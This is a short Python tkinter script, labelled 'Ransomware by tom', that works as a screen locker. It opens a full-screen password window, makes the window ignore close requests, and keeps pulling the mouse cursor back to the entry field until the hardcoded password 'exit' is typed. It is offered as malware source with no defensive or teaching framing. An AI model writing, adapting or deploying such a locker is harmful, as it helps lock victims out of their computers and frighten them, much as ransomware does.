from tkinter import *
from pyautogui import click, moveTo
from time import sleep

key = "exit"

def verifpass():
    if entry.get() == key:
        root.destroy()
def on_closing():
    pass
    

# Create window
root = Tk()

# Get window width and height
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

# Set the window title
root.title('Ransomware by tom')

# Make the window full-screen
root.attributes("-fullscreen", True)
#root.wm_attributes("-topmost", 1)


bg = PhotoImage(file = "earth.png")
# Show image using label
label2 = Label( root, image = bg)
label2.place(x = width/2, y = height/2, anchor=CENTER)

# Create entry field, set its size and location
entry = Entry(root, font=1, show="\u25CF")
entry.place(width=150, height=50, x=width/4, y=height/3)

# Create text captions and set their location
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻, modified by xymeria", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password", font='Arial 20')
label1.place(x=width/4, y=height/4)

#If the user attempts to close the window from the Task Manager, call on_closing
root.protocol("WM_DELETE_WINDOW", on_closing)

root.update()
# Click in the center of the window
click(10+width/4, 10+height/3)

while True:
    # Move the cursor to the center of the screen
    moveTo(10+width/4, 10+height/3)
    
    # Enable continuous updating of the window
    root.update()
    verifpass()
    sleep(0.02)
